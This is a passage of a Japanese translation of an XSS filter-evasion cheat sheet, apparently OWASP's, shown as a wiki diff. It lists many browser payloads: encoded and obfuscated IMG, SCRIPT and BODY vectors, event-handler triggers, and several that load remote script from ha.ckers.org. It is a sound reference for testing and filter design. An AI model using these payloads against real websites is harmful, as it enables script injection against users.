+<p>元々は Begeek が発見しました (クリーンアップされ、すべてのブラウザーで動作するように短縮化されています)。この XSS ベクトルは、指定の緩いレンダリングエンジンを使用して、IMG タグ内に XSS ベクトルを作成します。これは、引用符で囲んでカプセル化する必要があります。元々、ずさんなコーディングを修正することを目的としていたと思われます。これによって、HTML タグを正しく解析するのが非常に難しくなります。
+</p>
+<pre>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
+</pre>
+<h2><span class="mw-headline" id="fromCharCode">fromCharCode</span></h2>
+<p>引用符がいっさい許可されていない場合、JavaScript で fromCharCode を eval() 関数で処理して、必要な XSS ベクトルを作成できます。
+</p>
+<pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+</pre>
+<h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">SRC タグを初期化して、SRC ドメインを確認するフィルターを通過する</span></h2>
+<p>これは、大半の SRC ドメインフィルターをバイパスします。Javascript のイベントメソッドへの挿入は、Form、Iframe、Input、Embed などの要素を使用する、あらゆる HTML タグタイプの挿入にも適用できます。onblur、onclick など、タグタイプの関連イベントを代入できるため、ここで挙げた多くのインジェクションに関して多数のバリエーションを提供できます。
+David Cross による投稿。
+</p><p>Abdullah Hussam(@Abdulahhusam) による編集。
+</p>
+<pre>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
+</pre>
+<h2><span class="mw-headline" id="Default_SRC_tag_by_leaving_it_empty">SRC タグを空のままにする</span></h2>
+<pre>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
+</pre>
+<h2><span class="mw-headline" id="Default_SRC_tag_by_leaving_it_out_entirely">SRC タグを完全に除去する</span></h2>
+<pre>&lt;IMG onmouseover="alert('xxs')"&gt;
+</pre>
+<h2><span class="mw-headline" id="On_error_alert">On error アラート</span></h2>
+<pre>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
+</pre>
+<h2><span class="mw-headline" id="IMG_onerror_and_javascript_alert_encode">IMG onerror および javascript アラートのエンコード</span></h2>
+<pre>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
+</pre>
+<h2><span class="mw-headline" id="Decimal_HTML_character_references">10 進数の HTML 数値文字参照</span></h2>
+<p>javascript: ディレクティブを  &lt;IIMG タグ内で使用するすべての XSS の例は、Gecko レンダリングエンジンモードの Firefox または Netscape 8.1 以降では動作しません。詳しくは、XSS <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">計算機能</a>を使用してください。
+</p>
+<pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</pre>
+<h2><span class="mw-headline" id="Decimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンを使用しない、10 進数の HTML 数値文字参照</span></h2>
+<p>これは、"&amp;#XX;" を見つけようとする XSS で多くの場合効果的です。大半のユーザーは、合計で最大 7 桁の数字による埋め込みを知らないためです。また、$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; のような文字列に対してデコードを試みるユーザーにも有効です。このような文字列では、HTML エンコード文字列の終わりにセミコロンが必須という誤った前提に立っています (実際、このようなケースはありました)。
+</p>
+<pre>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</pre>
+<h2><span class="mw-headline" id="Hexadecimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンを使用しない、16 進数の HTML 数値文字参照</span></h2>
+<p>これも、上記の文字列 $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; に対する実行可能な XSS 攻撃で、ここではポンド記号の後に数字があることを前提としていますが、これは 16 進の HTML 文字には当てはまりません。詳しくは、XSS <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">計算機能</a>を使用してください。
+</p>
+<pre>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+</pre>
+<h2><span class="mw-headline" id="Embedded_tab">タブの埋め込み</span></h2>
+<p>クロスサイトスクリプティング攻撃を中断するために使用されます。 
+</p>
+<pre>&lt;IMG SRC="jav&#x9;ascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id="Embedded_Encoded_tab">エンコードしたタブ文字の埋め込み</span></h2>
+<p>これを使用して XSS を中断します。
+</p>
+<pre>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id="Embedded_newline_to_break_up_XSS">改行の埋め込みによる XSS の中断</span></h2>
+<p>一部の Web サイトでは、09 から 13 (10 進数) のいずれの文字もこの攻撃で機能するとしています。しかしそれは誤りです。09 (水平タブ)、10 (改行)、13 (復帰) のみが機能します。詳しくは、ASCII 表を参照してください。以下の 4 つの XSS の例がこのベクトルを説明しています。
+</p>
+<pre>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert('XSS');&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Embedded_carriage_return_to_break_up_XSS">復帰文字の埋め込みによる XSS の中断</span></h2>
+<p>(注: 前述を受けて、ゼロは省略できるため、これらの文字列を必要以上に長くしています。16 進数や 10 進数のエンコードが 2 文字または 3 文字であることを前提としたフィルターが実際には多くあります。実際のルールは、1 文字から 7 文字です)。
+</p>
+<pre>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="Null_breaks_up_JavaScript_directive">Null 値による JavaScript ディレクティブの中断</span></h2>
+<p>Null 文字も XSS ベクトルとして機能しますが、上記とは異なります。Burp Proxy などを使用して直接挿入するか、URL 文字列内で %00 を使用する必要があります。あるいは、独自のインジェクションツールを作成する場合、vim (^V^@ は null を生成) または以下のプログラムのいずれかを使用して、テキストファイル内に生成することもできます。訂正しておきます。旧バージョンの Opera (Windows の場合は 7.11 あたり) は追加文字 173 (ソフトハイフン制御文字) に対して脆弱でした。しかし、null char %00 は、より有用で、次の例のバリエーションを持つ、特定の実在のフィルターをバイパスするうえで役立ちます。
+</p>
+<pre>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt;  out
+</pre>
+<h2><span class="mw-headline" id="Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS">JavaScript 前のスペースおよびメタ文字</span></h2>
+<p>これは、パターンマッチが "javascript:" という単語でスペースを考慮していない場合有効です。レンダリングしないため、これは正しい前提ですが、そのため、引用符と "javascript:" キーワードの間にスペースを入れることができないという誤った前提ができています。実際には、10 進数で 1 から 32 までの任意の文字を持つことができます。 
+</p>
+<pre>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id="Non-alpha-non-digit_XSS">英数字以外の XSS</span></h2>
+<p>Firefox HTML パーサーは、HTML キーワードの後の英数字以外の文字は無効という前提にあるため、HTML タグの後のその文字を空白文字または無効なトークンと見なします。問題は、一部に、検索中のタグが空白文字によって分割されるということを前提にしている XSS フィルターがあることです。 
+例えば、"&lt;SCRIPT\s"&#160;!= "&lt;SCRIPT/XSS\s" です。
+</p>
+<pre>&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<p>しかし、上記と同じ考え方に基づき、Rnake ファザーを使用してさらに展開されます。Gecko レンダリングエンジンでは、アルファベット、数字、カプセル化文字 (引用符、不等号括弧など) 以外の任意の文字をイベントハンドラと等号の間で使用できるため、クロスサイトスクリプティングブロックを容易にバイパスできます。 これは、以下のように抑音符号文字にも適用できることに注意してください。
+</p>
+<pre>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+</pre>
+<p>Yair Amit によって、IE と Gecko のレンダリングエンジンに多少の動作の違いがあることがわかりましたが、これらでは、タグとパラメーターの間でスペースなしで、スラッシュのみが使用できます。これはシステムでスペースが許可されない場合に有効です。
+</p>
+<pre>&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="Extraneous_open_brackets">余計な左括弧</span></h2>
+<p>Franz Sedlmaier の投稿によれば、この XSS ベクトルは特定の検出エンジンを打ち負かすことができます。この種のエンジンは、左不等号括弧と右不等号括弧の一対のペアを最初に使用してから、中のタグを比較します。左不等号括弧と関連タグの文字列全体の一致を検索 (難読化解除後) する Boyer-Moore などの、より効率的なアルゴリズムを使用しません。二重スラッシュによって、外側の閉じ括弧をコメント化して、JavaScript エラーを抑えます。
+</p>
+<pre>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="No_closing_script_tags">スクリプトの終了タグなし</span></h2>
+<p> Gecko レンダリングエンジンモードの Firefox と Netscape 8.1 では、このクロスサイトスクリプティングベクトルの "&gt;&lt;/SCRIPT&gt" 部分は実際には必要ありません。Firefox では、HTML タグは閉じるのが安全という前提に立っているため、終了タグを自動的に追加します。よく考えられています。次の例と異なり (Firefox には影響ありませんが)、下には追加の HTML が必要ありません。必要があれば引用符を追加できますが、一般的に不要です。ただし、挿入された場合に、HTML が最終的にどのように見えるかはわかりません。
+</p>
+<pre>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;
+</pre>
+<h2><span class="mw-headline" id="Protocol_resolution_in_script_tags">スクリプトタグにおけるプロトコル解決</span></h2>
+<p>この特定のバリアントは、Łukasz Pilorz によって投稿されました。一部は下記の Ozh のプロトコル解決のバイパスに基づいています。このクロスサイトスクリプティングの例は、IE、IE レンダリングモードの Netscape、Opera で、&lt;/SCRIPT&gt; タグを末尾に追加した場合に動作します。しかし、これはスペースが問題になっている場合、またドメインが短ければ短いほど良い場合に特に有効です。エンコードのタイプに関係なく、".j" は有効です。ブラウザーが、SCRIPT タグのコンテキストで認識しているためです。
+</p>
+<pre>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+</pre>
+<h2><span class="mw-headline" id="Half_open_HTML.2FJavaScript_XSS_vector">片方の括弧がない HTML/JavaScript XSS ベクトル</span></h2>
+<p>Firefox と異なり、IE レンダリングエンジンは、ページに追加タグを追加しませんが、イメージで javascript: ディレクティブの使用を許可しています。右不等号括弧が必要ないため、これはベクトルとして有効です。これは、何らかの HTML タグがあり、その下にクロスサイトスクリプティングのベクトルを挿入できることを前提としています。終了タグ "&gt;" がなくても、下にあるタグにより閉じられます。注: 下にある HTML の内容によっては、HTML が壊れます。以下の NIDS 正規表現のようになります。/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn't require the end "&gt;".これは、&lt;IMG タグではなく、終了タグがない &lt;IFRAME タグを使用して遭遇した、実際の XSS フィルターに対しても有効でした。
+</p>
+<pre>&lt;IMG SRC="javascript:alert('XSS')"
+</pre>
+<h2><span class="mw-headline" id="Double_open_angle_brackets">二重左不等号括弧</span></h2>
+<p>右不等号括弧ではなく、左不等号括弧をベクトルの最後で使用すると、Netscape Gecko レンダリングで異なる動作が発生します。この括弧がない場合、Firefox は動作しますが、Netscape は動作しません。
+</p>
+<pre>&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
+</pre>
+<h2><span class="mw-headline" id="Escaping_JavaScript_escapes">JavaScript エスケープのエスケープ</span></h2>
+<p>アプリケーションが、JavaScript 内に一部のユーザー情報を出力するために作成された場合 (&lt;SCRIPT&gt;var a="$ENV{QUERY_STRING}";&lt;/SCRIPT&gt;)、および独自の JavaScript をそこに挿入したいが、サーバー側のアプリケーションが特定の引用符をエスケープしている場合、エスケープ文字をエスケープして、回避できます。これが挿入されると、&lt;SCRIPT&gt;var a="\\";alert('XSS');//";&lt;/SCRIPT&gt; になり、最後に二重引用符がアンエスケープされるため、クロスサイトスクリプティングのベクトルが発生します。XSS ロケーターは次のメソッドを使用します。
+</p>
+<pre>\";alert('XSS');//
+</pre>
+<p>また、正しい JSON または Javascript エスケープが埋め込みデータに適用済みで HTML エンコードに適用されていない場合、スクリプトブロックを終了し、独自のブロックを開始する方法もあります。
+</p>
+<pre>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;
+</pre>
+<h2><span class="mw-headline" id="End_title_tag">タイトルタグの終了</span></h2>
+<p>これは、&lt;TITLE&gt; タグを閉じる単純な XSS ベクトルで、悪意のあるクロスサイトスクリプティング攻撃をカプセル化します。
+</p>
+<pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="INPUT_image">INPUT イメージ</span></h2>
+<pre>&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="BODY_image">BODY イメージ</span></h2>
+<pre>&lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="IMG_Dynsrc">IMG Dynsrc</span></h2>
+<pre>&lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="IMG_lowsrc">IMG lowsrc</span></h2>
+<pre>&lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="List-style-image">List-style-image</span></h2>
+<p>箇条書きの埋め込みイメージを処理する際に比較的厄介な問題です。JavaScript ディレクティブであるため、IE レンダリングエンジンでのみ動作します。特別に有効なクロスサイトスクリプティングベクトルではありません。
+</p>
+<pre>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
+</pre>
+<h2><span class="mw-headline" id="VBscript_in_an_image">イメージ内の VBscript</span></h2>
+<pre>&lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&gt;
+</pre>
+<h2><span class="mw-headline" id="Livescript_.28older_versions_of_Netscape_only.29">Livescript (旧バージョンの Netscape のみ)</span></h2>
+<pre>&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="BODY_tag">BODY タグ</span></h2>
+<p>メソッドでは、XSS 攻撃を実施するために、"javascript:" または "&lt;SCRIPT..." のバリアントを使用する必要がありません。 Dan Crowley は、等号の前にスペースを配置できると追加で指摘しています ("onload="&#160;!= "onload =")。
+</p>
+<pre>&lt;BODY ONLOAD=alert('XSS')&gt;
+</pre>
+<h2><span class="mw-headline" id="Event_Handlers">イベントハンドラ</span></h2>
+<p>前述と同様の XSS 攻撃で使用できます (これは、この資料の作成時点で、ネットで最も包括的なリストです)。HTML+TIME 更新に関して、Rene Ledosquet に謝意を表します。
+</p><p><a rel="nofollow" class="external text" href="http://help.dottoro.com/">Dottoro Web リファレンス</a>にも優れた <a rel="nofollow" class="external text" href="http://help.dottoro.com/ljfvvdnm.php">JavaScript のイベントのリスト</a>があります。
+</p>
+<ol>
+<li> <code>FSCommand()</code> (埋め込み Flash オブジェクト内から実行するときに攻撃者が使用できます)
+</li>
+<li> <code>onAbort()</code> (ユーザーがイメージの読み込みを中止したとき)
+</li>
+<li> <code>onActivate()</code> (オブジェクトが動的要素として設定されたとき)
+</li>
+<li> <code>onAfterPrint()</code> (ユーザーが印刷、または印刷ジョブをプレビューした後アクティブ化)
+</li>
+<li> <code>onAfterUpdate()</code> (ソースオブジェクト内のデータ更新後、データオブジェクトでアクティブ化)
+</li>
+<li> <code>onBeforeActivate()</code> (オブジェクトが動的要素として設定される前に実行)
+</li>
+<li> <code>onBeforeCopy()</code> (選択したものがクリップボードにコピーされる直前に攻撃者は攻撃文字列を実行します。攻撃者は、<code>execCommand("Copy")</code> 関数を使用してこれを実行できます)
+</li>
+<li> <code>onBeforeCut()</code> (攻撃者は、セッション切断直前に攻撃文字列を実行)
+</li>
+<li> <code>onBeforeDeactivate()</code> (activeElement が現在のオブジェクトから変更された直後に実行)
+</li>
+<li> <code>onBeforeEditFocus()</code> (編集可能な要素に含まれているオブジェクトが UI アクティブ化状態になる前、または編集可能なコンテナオブジェクトが選択された制御になったときに実行)
+</li>
+<li> <code>onBeforePaste()</code> (ユーザーは、<code>execCommand("Paste")</code> 関数を使用して、貼り付けをするように仕向けられたり、強制されたりします)
+</li>
+<li> <code>onBeforePrint()</code> (ユーザーは、印刷するように仕向けられます。あるいは、攻撃者が、<code>print()</code> 関数または <code>execCommand("Print")</code> 関数を使用できます)
+</li>
+<li> <code>onBeforeUnload()</code> (ユーザーを、ブラウザーを終了するように仕向ける必要があります。攻撃者は、親から生成された場合でなければ、ウィンドウをアンロードできません)
+</li>
+<li> <code>onBeforeUpdate()</code> (ソースオブジェクト内のデータ更新前に、データオブジェクトでアクティブ化します)
+</li>
+<li> <code>onBegin()</code> (要素のタイムラインが開始されると即時に onbegin イベントが実行されます)
+</li>
+<li> <code>onBlur()</code> (別のポップアップが読み込まれ、ウィンドウがフォーカスを失った場合)
+</li>
+<li> <code>onBounce()</code> (マーキーオブジェクトの動作プロパティが "alternate" に設定され、マーキーのコンテンツがウィンドウの片方の端に到達したときに実行されます)
+</li>
+<li> <code>onCellChange()</code> (データプロバイダーでデータが変更になると実行されます)
+</li>
+<li> <code>onChange()</code> (選択、テキスト、または TEXTAREA フィールドがフォーカスを失い、値が変更された場合)
+</li>
+<li> <code>onClick()</code> (フォームがクリックされた場合)
+</li>
+<li> <code>onContextMenu()</code> (ユーザーが攻撃領域を右クリックする必要があります)
+</li>
+<li> <code>onControlSelect()</code> (ユーザーがオブジェクトの制御を選択しようとすると実行されます)
+</li>
+<li> <code>onCopy()</code> (ユーザーが何かをコピーするか、または <code>execCommand("Copy")</code> コマンドを使用して攻略される必要があります)
+</li>
+<li> <code>onCut()</code> (ユーザーが何かをコピーするか、または <code>execCommand("Cut")</code> コマンドを使用して攻略される必要があります)
+</li>
+<li> <code>onDataAvailable()</code> (ユーザーが要素内のデータを変更するか、または攻撃者が同じ機能を実行できる必要があります)
+</li>
+<li> <code>onDataSetChanged()</code> (データソースオブジェクトによって公開されたデータセットが変更になった場合実行されます)
+</li>
+<li> <code>onDataSetComplete()</code> (すべてのデータがデータソースオブジェクトから使用可能であることを示すために実行されます)
+</li>
+<li> <code>onDblClick()</code> (フォーム要素またはリンクがダブルクリックされた場合)
+</li>
+<li> <code>onDeactivate()</code> (activeElement が現在のオブジェクトから親ドキュメント内の別のオブジェクトに変更されたときに実行されます)
+</li>
+<li> <code>onDrag()</code> (ユーザーがオブジェクトをドラッグする必要があります)
+</li>
+<li> <code>onDragEnd()</code> (ユーザーがオブジェクトをドラッグする必要があります)
+</li>
+<li> <code>onDragLeave()</code> (ユーザーがオブジェクトを有効な場所にドラッグして離す必要があります)
+</li>
+<li> <code>onDragEnter()</code> (ユーザーがオブジェクトを有効な場所にドラッグする必要があります)
+</li>
+<li> <code>onDragOver()</code> (ユーザーがオブジェクトを有効な場所にドラッグする必要があります)
+</li>
+<li> <code>onDragDrop()</code> (ユーザーがファイルなどのオブジェクトをブラウザーウィンドウにドロップします)
+</li>
+<li> <code>onDragStart()</code> (ユーザーがドラッグ操作を開始すると発生します)
+</li>
+<li> <code>onDrop()</code> (ユーザーがファイルなどのオブジェクトをブラウザーウィンドウにドロップします)
+</li>
+<li> <code>onEnd()</code> (タイムラインが終了すると onEnd イベントが発生します)    
+</li>
+<li> <code>onError()</code> (ドキュメントまたはイメージの読み込みによってエラーが発生します)
+</li>
+<li> <code>onErrorUpdate()</code> (データソースオブジェクト内の関連データの更新時にエラーが発生すると、データバインドオブジェクトで実行されます)
+</li>
+<li> <code>onFilterChange()</code> (仮想フィルターの状態変更が完了すると実行されます)
+</li>
+<li> <code>onFinish()</code> (マーキーがループを終了すると攻撃者はエクスプロイトを作成できます)
+</li>
+<li> <code>onFocus()</code> (ウィンドウがフォーカスを取得すると、攻撃者は攻撃文字列を実行します)
+</li>
+<li> <code>onFocusIn()</code> (ウィンドウがフォーカスを取得すると、攻撃者は攻撃文字列を実行します)
+</li>
+<li> <code>onFocusOut()</code> (ウィンドウがフォーカスを失うと、攻撃者は攻撃文字列を実行します)
+</li>
+<li> <code>onHashChange()</code> (ドキュメントの現在のアドレスのフラグメント ID 部分が変更されると実行されます)
+</li>
+<li> <code>onHelp()</code> (ウィンドウにフォーカスがある間にユーザーが F1 キーを押すと、攻撃者は攻撃文字列を実行します)
+</li>
+<li> <code>onInput()</code> (要素のテキストコンテンツがユーザーインターフェイス を使用して変更された場合)
+</li>
+<li> <code>onKeyDown()</code> (ユーザーがキーを押した場合)
+</li>
+<li> <code>onKeyPress()</code> (ユーザーがキーを押すか、キーを押したままにした場合)
+</li>
+<li> <code>onKeyUp()</code> (ユーザーがキーを離した場合)
+</li>
+<li> <code>onLayoutComplete()</code> (ユーザーが印刷、または印刷のプレビューを実行した場合)
+</li>
+<li> <code>onLoad()</code> (ウィンドウが読み込まれた後、攻撃者は攻撃文字列を実行します)
+</li>
+<li> <code>onLoseCapture()</code> (<code>releaseCapture()</code> メソッドによって攻略できます)
+</li>
+<li> <code>onMediaComplete()</code> (ストリーミングメディアファイルが使用されると、ファイルの再生が開始される前にこのイベントが実行されます)
+</li>
+<li> <code>onMediaError()</code> (ユーザーはブラウザーでメディアファイルを含むページを開き、問題があるとイベントが実行されます)
+</li>
+<li> <code>onMessage()</code> (ドキュメントがメッセージを受け取ると実行されます)
+</li>
+<li> <code>onMouseDown()</code> (攻撃者は、ユーザーにイメージをクリックさせる必要があります)
+</li>
+<li> <code>onMouseEnter()</code> (カーソルがオブジェクトまたは領域の上に移動します)
+</li>
+<li> <code>onMouseLeave()</code> (攻撃者は、ユーザーにイメージまたはテーブルの上にマウスカーソルを重ねてから、離させる必要があります)
+</li>
+<li> <code>onMouseMove()</code> (攻撃者は、ユーザーにイメージまたはテーブルにマウスカーソルを重ねさせる必要があります)
+</li>
+<li> <code>onMouseOut()</code> (攻撃者は、ユーザーにイメージまたはテーブルの上にマウスカーソルを重ねてから、離させる必要があります)
+</li>
+<li> <code>onMouseOver()</code> (カーソルがオブジェクトまたは領域の上に移動します)
+</li>
+<li> <code>onMouseUp()</code> (攻撃者は、ユーザーにイメージをクリックさせる必要があります)
+</li>
+<li> <code>onMouseWheel()</code> (攻撃者は、ユーザーにマウスホイールを使用させる必要があります)
+</li>
+<li> <code>onMove()</code> (ユーザーまたは攻撃者がページを移動した場合)
+</li>
+<li> <code>onMoveEnd()</code> (ユーザーまたは攻撃者がページを移動した場合)
+</li>
+<li> <code>onMoveStart()</code> (ユーザーまたは攻撃者がページを移動した場合)
+</li>
+<li> <code>onOffline()</code> (オンラインモードで動作していたブラウザーがオフラインでの動作を開始すると発生します)
+</li>
+<li> <code>onOnline()</code> (オフラインモードで動作していたブラウザーがオンラインでの動作を開始すると発生します)
+</li>
+<li> <code>onOutOfSync()</code> (タイムラインで定義されたとおりの要素によるメディアの再生を中断します)
+</li>
+<li> <code>onPaste()</code> (ユーザーが貼り付けを行うか、または攻撃者が <code>execCommand("Paste")</code> 関数を使用する必要があります)
+</li>
+<li> <code>onPause()</code> (body 要素など、タイムラインが一時停止したときにアクティブであるあらゆる要素で onpause イベントが実行されます)
+</li>
+<li> <code>onPopState()</code> (ユーザーがセッション履歴をナビゲートすると実行されます)
+</li>
+<li> <code>onProgress()</code> (攻撃者は、Flash 動画が読み込まれたときにこれを使用します)
+</li>
+<li> <code>onPropertyChange()</code> (ユーザーまたは攻撃者は要素プロパティを変更する必要があります)
+</li>
+<li> <code>onReadyStateChange()</code> (ユーザーまたは攻撃者は要素プロパティを変更する必要があります)
+</li>
+<li> <code>onRedo()</code> (ユーザーが元に戻すトランザクション履歴をたどって前に進んだ場合)
+</li>
+<li> <code>onRepeat()</code> (初回のサイクル全体を除き、タイムラインの繰り返しごとにイベントが実行されます)
+</li>
+<li> <code>onReset()</code> (ユーザーまたは攻撃者がフォームをリセットした場合)
+</li>
+<li> <code>onResize()</code> (ユーザーがウィンドウのサイズを変更した場合、または攻撃者が次のように自動的に初期化した場合: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+</li>
+<li> <code>onResizeEnd()</code> (ユーザーがウィンドウのサイズを変更した場合、または攻撃者が次のように自動的に初期化した場合: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+</li>
+<li> <code>onResizeStart()</code> (ユーザーがウィンドウのサイズを変更した場合、または攻撃者が次のように自動的に初期化した場合: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)
+</li>
+<li> <code>onResume()</code> (body 要素など、タイムラインが再開したときにアクティブになったあらゆる要素で onresume イベントが実行されます)
+</li>
+<li> <code>onReverse()</code> (要素に 2 回以上の repeatCount がある場合、タイムラインが逆再生を開始するたびにこのイベントが実行されます)
+</li>
+<li> <code>onRowsEnter()</code> (ユーザーまたは攻撃者は、データソース内の行を変更する必要があります)
+</li>
+<li> <code>onRowExit()</code> (ユーザーまたは攻撃者は、データソース内の行を変更する必要があります)
+</li>
+<li> <code>onRowDelete()</code> (ユーザーまたは攻撃者は、データソース内の行を削除する必要があります)
+</li>
+<li> <code>onRowInserted()</code> (ユーザーまたは攻撃者は、データソース内に行を挿入する必要があります)
+</li>
+<li> <code>onScroll()</code> (ユーザーがスクロールするか、または攻撃者が <code>scrollBy()</code> 関数を使用する必要があります)
+</li>
+<li> <code>onSeek()</code> (タイムラインが順再生以外の方向に再生を開始しようとすると onreverse イベントが実行されます)
+</li>
+<li> <code>onSelect()</code> (ユーザーがテキストを選択するか、または攻撃者が <code>window.document.execCommand("SelectAll");</code> のように自動的に初期化する必要があります)
+</li>
+<li> <code>onSelectionChange()</code> (ユーザーがテキストを選択するか、または攻撃者が <code>window.document.execCommand("SelectAll");</code> のように自動的に初期化する必要があります)
+</li>
+<li> <code>onSelectStart()</code> (ユーザーがテキストを選択するか、または攻撃者が <code>window.document.execCommand("SelectAll");</code> のように自動的に初期化する必要があります)
+</li>
+<li> <code>onStart()</code> (各マーキーループの開始時に実行されます)
+</li>
+<li> <code>onStop()</code> (ユーザーが停止ボタンを押すか、Web ページから離れる必要があります)
+</li>
+<li> <code>onStorage()</code> (ストレージ領域が変更された場合)
+</li>
+<li> <code>onSyncRestored()</code> (タイムラインで実行するように定義されたとおりの要素によるメディアの再生をユーザーが中断します)
+</li>
+<li> <code>onSubmit()</code> (攻撃者またはユーザーがフォームを送信する必要があります)
+</li>
+<li> <code>onTimeError()</code> (ユーザーまたは攻撃者が、dur などの時間プロパティを無効な値に設定した場合)
+</li>
+<li> <code>onTrackChange()</code> (ユーザーまたは攻撃者が、再生リストのトラックを変更した場合)
+</li>
+<li> <code>onUndo()</code> (ユーザーが元に戻すトランザクション履歴を遡って逆に進んだ場合)
+</li>
+<li> <code>onUnload()</code> (ユーザーが任意のリンクをクリックするか、または戻るボタンを押すか、攻撃者がクリックを強制した場合)
+</li>
+<li> <code>onURLFlip()</code> (このイベントは、HTML+TIME (Timed Interactive Multimedia Extensions) メディアタグによって再生される Advanced Streaming Format (ASF) ファイルが ASF ファイルに埋め込まれたスクリプトコマンドを処理したときに実行されます)
+</li>
+<li> <code>seekSegmentTime()</code> (これは、要素のセグメントタイムラインで指定されたポイントを特定し、そのポイントから再生を開始するメソッドです。セグメントは、AUTOREVERSE 属性を使用した逆再生を含む、タイムラインの繰り返しから構成されます。)
+</li>
+</ol>
+<h2><span class="mw-headline" id="BGSOUND">BGSOUND</span></h2>
+<pre>&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id=".26_JavaScript_includes">&amp; JavaScript includes</span></h2>
+<pre>&lt;BR SIZE=&quot;&amp;{alert('XSS')}&quot;&gt;
+</pre>
+<h2><span class="mw-headline" id="STYLE_sheet">STYLE シート</span></h2>
+<pre>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id="Remote_style_sheet">リモートスタイルシート</span></h2>
